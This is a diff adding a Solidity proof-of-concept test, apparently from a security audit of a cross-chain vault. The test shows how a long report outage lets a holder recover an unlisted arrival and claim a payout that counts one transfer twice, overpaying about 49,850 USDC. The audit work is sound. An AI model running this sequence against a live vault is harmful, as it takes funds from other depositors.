@@ -90,6 +90,41 @@ contract New_PreSeededUnlistedArrivalRecovery is CoreBCrossChainFixture {
         assertEq(aliceValue, 448_725_000_000, "Alice is left with 448,725 instead of about 498,700");
     }
 
+    /// @dev Without pre-seeding, the same double count after a report outage longer than the recovery delay: the
+    ///      delay proves no future report can list the id, not that the latest ACCEPTED report no longer shows the
+    ///      principal on the spoke. Payouts never check report age (S-28), so a holder recovers and claims at once.
+    function test_POC_NEW_S04_recoveryDuringALongOutageCountsTheTransferTwice() public {
+        _deposit(alice, 500_000e6);
+        _deposit(bob, 500_000e6);
+        _report(); // S-14
+        bytes32 out = _sendToSpoke(SEND, ARRIVES);
+        _fillOnSpoke(out, ARRIVES);
+        _report(); // the last report the hub will accept for days: the spoke holds 99,950 USDG
+        uint256 fairAssets = vault.shareAssets();
+        vm.prank(bob);
+        vault.requestPayout(1_000_000e6, ICoreVault.PayoutMode.Standard);
+
+        vm.prank(manager);
+        bytes32 home = spoke.sendToHub(
+            ARRIVES, TransferKind.Principal, 0, BridgeQuote(HOME_OUT, uint32(block.timestamp), 0, address(0))
+        );
+        vm.warp(block.timestamp + 2 minutes);
+        _fillOnHub(home, HOME_OUT, TransferKind.Principal);
+
+        // No report is delivered for 6 h + 3 days + 2 x maxReportAge (keeper or Wormhole outage).
+        vm.warp(block.timestamp + 6 hours + ReportCodec.HUB_BOUND_RETENTION + 2 * uint256(MAX_REPORT_AGE));
+        _refreshPrices();
+        vm.startPrank(bob);
+        vault.recoverUnlistedArrival(0, home);
+        uint256 inflatedAssets = vault.shareAssets();
+        ICoreVault.PayoutReceipt memory r = vault.claimPayout("");
+        vm.stopPrank();
+        console2.log("Share Assets fair / after the recovery", fairAssets, inflatedAssets);
+        console2.log("Bob paid", r.usdcPaid);
+        assertEq(inflatedAssets, fairAssets + HOME_OUT, "Idle and the stale report both count the transfer");
+        assertEq(r.usdcPaid, 547_303_312_500, "the same 49,850 USDC overpayment as with pre-seeding");
+    }
+
     /// @dev Same lever on an Income send home: the S-4 "kind" residual (recovered as Principal, no fee split, no
     ///      accumulator), which the register says needs a multi-day report outage, is reachable at once.
     function test_POC_NEW_S04_preSeededIncomeSendHomeIsCreditedAsPrincipalWithoutFees() public {
